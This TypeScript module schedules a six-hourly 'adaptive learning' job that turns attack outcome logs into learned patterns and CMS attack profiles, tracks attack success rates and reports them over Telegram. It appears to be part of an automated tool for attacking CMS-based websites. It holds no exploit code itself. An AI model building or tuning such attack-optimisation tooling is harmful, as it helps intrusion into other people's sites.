/**
 * Learning Scheduler — Periodic Adaptive Learning Cycle Runner
 *
 * Runs the adaptive learning cycle every 6 hours to:
 *   1. Aggregate attack outcome logs into learned_patterns
 *   2. Rebuild CMS attack profiles from historical data
 *   3. Log results and send Telegram notification on significant changes
 *
 * Pattern: setInterval-based scheduler (same as seo-scheduler, cve-scheduler)
 * Checks every 6 hours — no DB polling needed, just runs the cycle.
 */
import { runLearningCycle, getAdaptiveLearningStats } from "./adaptive-learning";
import { sendTelegramNotification } from "./telegram-notifier";

// ═══════════════════════════════════════════════
//  CONFIGURATION
// ═══════════════════════════════════════════════

/** Run learning cycle every 6 hours */
const LEARNING_INTERVAL_MS = 6 * 60 * 60 * 1000; // 6 hours

/** Minimum outcomes needed before running a learning cycle */
const MIN_OUTCOMES_FOR_CYCLE = 3;

/** Notify via Telegram when patterns change significantly */
const NOTIFY_ON_SIGNIFICANT_CHANGE = true;

/** Threshold: notify if more than N patterns were updated */
const SIGNIFICANT_PATTERN_THRESHOLD = 5;

// ═══════════════════════════════════════════════
//  STATE
// ═══════════════════════════════════════════════

let schedulerTimer: ReturnType<typeof setInterval> | null = null;
let isRunning = false;
let lastRunAt: Date | null = null;
let lastResult: { patternsUpdated: number; profilesUpdated: number } | null = null;
let totalCyclesRun = 0;
let totalCyclesFailed = 0;
let consecutiveFailures = 0;

// ═══════════════════════════════════════════════
//  CORE CYCLE
// ═══════════════════════════════════════════════

/**
 * Execute one learning cycle — aggregate patterns + rebuild profiles
 */
export async function executeLearningCycle(): Promise<{
  success: boolean;
  patternsUpdated: number;
  profilesUpdated: number;
  durationMs: number;
  skipped: boolean;
  skipReason?: string;
}> {
  if (isRunning) {
    console.log("[Learning Scheduler] ⏭ Cycle already running, skipping...");
    return { success: true, patternsUpdated: 0, profilesUpdated: 0, durationMs: 0, skipped: true, skipReason: "already_running" };
  }

  isRunning = true;
  const startTime = Date.now();

  try {
    // Check if we have enough data to warrant a learning cycle
    const stats = await getAdaptiveLearningStats();
    if (stats.totalOutcomesRecorded < MIN_OUTCOMES_FOR_CYCLE) {
      console.log(`[Learning Scheduler] ⏭ Only ${stats.totalOutcomesRecorded} outcomes recorded (need ${MIN_OUTCOMES_FOR_CYCLE}), skipping cycle`);
      isRunning = false;
      return {
        success: true,
        patternsUpdated: 0,
        profilesUpdated: 0,
        durationMs: Date.now() - startTime,
        skipped: true,
        skipReason: `insufficient_data (${stats.totalOutcomesRecorded}/${MIN_OUTCOMES_FOR_CYCLE})`,
      };
    }

    console.log(`[Learning Scheduler] 🧠 Starting learning cycle #${totalCyclesRun + 1}...`);
    console.log(`[Learning Scheduler]   Total outcomes: ${stats.totalOutcomesRecorded} | Success rate: ${stats.overallSuccessRate.toFixed(1)}%`);

    // Run the actual learning cycle
    const result = await runLearningCycle();
    const durationMs = Date.now() - startTime;

    // Update state
    lastRunAt = new Date();
    lastResult = result;
    totalCyclesRun++;
    consecutiveFailures = 0;

    console.log(`[Learning Scheduler] ✅ Cycle #${totalCyclesRun} complete in ${(durationMs / 1000).toFixed(1)}s`);
    console.log(`[Learning Scheduler]   Patterns updated: ${result.patternsUpdated} | Profiles updated: ${result.profilesUpdated}`);

    // Send Telegram notification for significant changes
    if (NOTIFY_ON_SIGNIFICANT_CHANGE && (result.patternsUpdated >= SIGNIFICANT_PATTERN_THRESHOLD || result.profilesUpdated >= 3)) {
      try {
        await sendTelegramNotification({
          type: "info",
          targetUrl: "adaptive-learning",
          details:
            `🧠 Adaptive Learning Cycle #${totalCyclesRun}\n\n` +
            `📊 Patterns updated: ${result.patternsUpdated}\n` +
            `🎯 CMS profiles updated: ${result.profilesUpdated}\n` +
            `⏱ Duration: ${(durationMs / 1000).toFixed(1)}s\n` +
            `📈 Overall success rate: ${stats.overallSuccessRate.toFixed(1)}%\n` +
            `📦 Total outcomes: ${stats.totalOutcomesRecorded}`,
        });
      } catch (notifyErr) {
        console.warn("[Learning Scheduler] Failed to send Telegram notification:", (notifyErr as Error).message);
      }
    }

    return { success: true, ...result, durationMs, skipped: false };
  } catch (err) {
    const durationMs = Date.now() - startTime;
    totalCyclesFailed++;
    consecutiveFailures++;

    console.error(`[Learning Scheduler] ❌ Cycle failed (attempt ${consecutiveFailures}):`, (err as Error).message);

    // If too many consecutive failures, log a warning
    if (consecutiveFailures >= 3) {
      console.error(`[Learning Scheduler] ⚠️ ${consecutiveFailures} consecutive failures — check DB connection and adaptive-learning module`);
    }

    return { success: false, patternsUpdated: 0, profilesUpdated: 0, durationMs, skipped: false };
  } finally {
    isRunning = false;
  }
}

// ═══════════════════════════════════════════════
//  SCHEDULER LIFECYCLE
// ═══════════════════════════════════════════════

/**
 * Start the learning scheduler — runs every 6 hours
 * First run is delayed 5 minutes after server start to avoid startup load
 */
export function startLearningScheduler() {
  if (schedulerTimer) {
    console.log("[Learning Scheduler] Already running, ignoring duplicate start");
    return;
  }

  console.log(`[Learning Scheduler] 🚀 Started — learning cycle every ${LEARNING_INTERVAL_MS / (60 * 60 * 1000)}h`);

  // Delay first run by 5 minutes to let server fully initialize
  const INITIAL_DELAY_MS = 5 * 60 * 1000;
  setTimeout(() => {
    console.log("[Learning Scheduler] Running initial learning cycle...");
    executeLearningCycle().catch(err =>
      console.error("[Learning Scheduler] Error on initial run:", (err as Error).message)
    );
  }, INITIAL_DELAY_MS);

  // Then run every 6 hours
  schedulerTimer = setInterval(() => {
    executeLearningCycle().catch(err =>
      console.error("[Learning Scheduler] Error on scheduled run:", (err as Error).message)
    );
  }, LEARNING_INTERVAL_MS);
}

/**
 * Stop the learning scheduler
 */
export function stopLearningScheduler() {
  if (schedulerTimer) {
    clearInterval(schedulerTimer);
    schedulerTimer = null;
    console.log("[Learning Scheduler] ⏹ Stopped");
  }
}

/**
 * Get the current scheduler status
 */
export function getLearningSchedulerStatus() {
  return {
    isActive: schedulerTimer !== null,
    isRunning,
    lastRunAt,
    lastResult,
    totalCyclesRun,
    totalCyclesFailed,
    consecutiveFailures,
    intervalMs: LEARNING_INTERVAL_MS,
    intervalHuman: `${LEARNING_INTERVAL_MS / (60 * 60 * 1000)}h`,
    minOutcomesForCycle: MIN_OUTCOMES_FOR_CYCLE,
  };
}
